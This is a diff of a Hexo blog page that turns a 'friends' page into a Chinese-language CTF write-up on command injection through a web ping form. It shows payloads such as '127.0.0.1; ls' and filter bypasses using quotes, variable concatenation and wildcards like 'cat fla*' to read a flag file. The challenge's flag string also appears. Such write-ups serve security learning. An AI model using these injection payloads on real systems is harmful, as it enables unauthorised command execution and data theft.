@@ -4,17 +4,21 @@
   <meta charset="utf-8">
   
   
-  <title>friends | Hexo</title>
+  <title>webPing？？ | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="friends">
-<meta property="og:url" content="https://penhuoshuwa.github.io/friends/index.html">
+  <meta name="description" content="Ping？？？？ 命令注入先看看网页源代码，没有收获输入本机地址127.0.0.1试试ping通了 找找有没有flag查看当前目录127.0.0.1; ls找到了flag文件，尝试读取127.0.0.1; cat flag.txt发现被过滤，绕过过滤输入：127.0.0.1; cat “flag.txt”（引号绕过）—无果输入：127.0.0.1; a&#x3D;flag; b&#x3D;.txt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="webPing？？">
+<meta property="og:url" content="https://penhuoshuwa.github.io/2025/11/05/Ping%EF%BC%9F%EF%BC%9F/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Ping？？？？ 命令注入先看看网页源代码，没有收获输入本机地址127.0.0.1试试ping通了 找找有没有flag查看当前目录127.0.0.1; ls找到了flag文件，尝试读取127.0.0.1; cat flag.txt发现被过滤，绕过过滤输入：127.0.0.1; cat “flag.txt”（引号绕过）—无果输入：127.0.0.1; a&#x3D;flag; b&#x3D;.txt">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-10-12T04:29:18.000Z">
-<meta property="article:modified_time" content="2025-10-12T04:30:19.689Z">
+<meta property="og:image" content="https://penhuoshuwa.github.io/images/w1-2.png">
+<meta property="article:published_time" content="2025-11-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-04T17:20:13.099Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://penhuoshuwa.github.io/images/w1-2.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -71,12 +75,16 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="friends-" class="h-entry article article-type-friends" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-Ping？？" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/friends/index.html" class="article-date">
-  <time class="dt-published" datetime="2025-10-12T04:29:18.000Z" itemprop="datePublished">2025-10-12</time>
+    <a href="/2025/11/05/Ping%EF%BC%9F%EF%BC%9F/" class="article-date">
+  <time class="dt-published" datetime="2025-11-04T16:00:00.000Z" itemprop="datePublished">2025-11-05</time>
 </a>
     
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/2025-CTF-week1/">2025-?CTF-week1</a>
+  </div>
+
   </div>
   <div class="article-inner">
     
@@ -85,7 +93,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      friends
+      webPing？？
     </h1>
   
 
@@ -93,11 +101,15 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        
+        <h1 id="Ping？？？？-命令注入"><a href="#Ping？？？？-命令注入" class="headerlink" title="Ping？？？？ 命令注入"></a>Ping？？？？ 命令注入</h1><h2 id="先看看网页源代码，没有收获"><a href="#先看看网页源代码，没有收获" class="headerlink" title="先看看网页源代码，没有收获"></a>先看看网页源代码，没有收获</h2><h2 id="输入本机地址127-0-0-1试试"><a href="#输入本机地址127-0-0-1试试" class="headerlink" title="输入本机地址127.0.0.1试试"></a>输入本机地址127.0.0.1试试</h2><p>ping通了</p>
+<h2 id="找找有没有flag"><a href="#找找有没有flag" class="headerlink" title="找找有没有flag"></a>找找有没有flag</h2><p>查看当前目录127.0.0.1; ls<br><img src="/images/w1-2.png"><br>找到了flag文件，尝试读取<br>127.0.0.1; cat flag.txt<br>发现被过滤，绕过过滤<br>输入：127.0.0.1; cat “flag.txt”（引号绕过）—无果<br>输入：127.0.0.1; a&#x3D;flag; b&#x3D;.txt; cat $a$b（变量拼接）—无果<br>输入：127.0.0.1; cat fla*（使用通配符）—成功<br>flag{dd4adb53-4a00-43a4-b000-1ab3dcdd263e}</p>
+<h2 id="看看过滤词"><a href="#看看过滤词" class="headerlink" title="看看过滤词"></a>看看过滤词</h2><p>输入：127.0.0.1; cat fla?.txt<br>输入：127.0.0.1; cat fla[g,h,x,z].txt<br>因此只需要不出现完整的flag便可绕过过滤</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>先看网页源代码<br>输入本机地址查看是否能ping通<br>查找当前目录（127.0.0.1; ls）、查找隐藏目录（127.0.0.1; ls -la）、查找根目录（127.0.0.1; ls &#x2F;）<br>找到flag.txt<br>绕过过滤获得flag</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://penhuoshuwa.github.io/friends/index.html" data-id="cmhku53as0002rcw94heralob" data-title="friends" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://penhuoshuwa.github.io/2025/11/05/Ping%EF%BC%9F%EF%BC%9F/" data-id="cmhku53aq0001rcw9ed3iceyi" data-title="webPing？？" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -105,6 +117,16 @@
   </div>
   
     
+<nav id="article-nav">
+  
+  
+    <a href="/2025/11/05/%E5%89%8D%E7%AB%AF%E5%B0%8F%E6%B8%B8%E6%88%8F/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">web前端小游戏</div>
+    </a>
+  
+</nav>
+
   
 </article>
 
